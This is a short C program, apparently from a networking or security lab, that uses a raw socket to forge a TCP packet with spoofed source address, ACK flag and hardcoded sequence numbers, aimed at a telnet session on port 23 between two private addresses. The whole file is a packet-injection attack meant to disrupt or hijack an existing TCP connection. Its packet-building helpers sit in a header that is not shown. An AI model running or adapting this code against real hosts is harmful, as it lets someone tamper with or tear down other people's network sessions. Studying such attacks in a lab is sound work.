#include "tcp-disrupt.h"

int main(int argc, char **argv) {
  int sock, one = 1;

  //Setup
  char *srcIP = "192.168.1.112";
  char *dstIP = "192.168.1.113";
  int dstPort = 23;
  int srcPort = 59590;
  int packet_size = 44;

  //Ethernet header + IP header + TCP header + data
  char packet[packet_size];

  //Address struct to sendto()
  struct sockaddr_in addr_in;
  
  //Raw socket without any protocol-header inside
  if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("Error while creating socket");
    exit(-1);
  }

  //Set option IP_HDRINCL (headers are included in packet)
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
    perror("Error while setting socket options");
    exit(-1);
  }

  //Populate address struct
  addr_in.sin_family = AF_INET;
  addr_in.sin_port = htons(dstPort);
  addr_in.sin_addr.s_addr = inet_addr(dstIP);

  //Allocate mem for ip and tcp headers and zero the allocation
  
 
  //Send lots of packets
  int k = 5;
  while(k--) { 
    
    gen_packet( srcIP,
                dstIP,
                dstPort,
                srcPort,
                0, //syn
                1, //ack
                4012204404, //seq
                2948134111, //syn_ack
                'z', //data
                packet,
                packet_size);

    send_packet(sock, packet, addr_in);
    

    break;
  }
  
  return 0;
}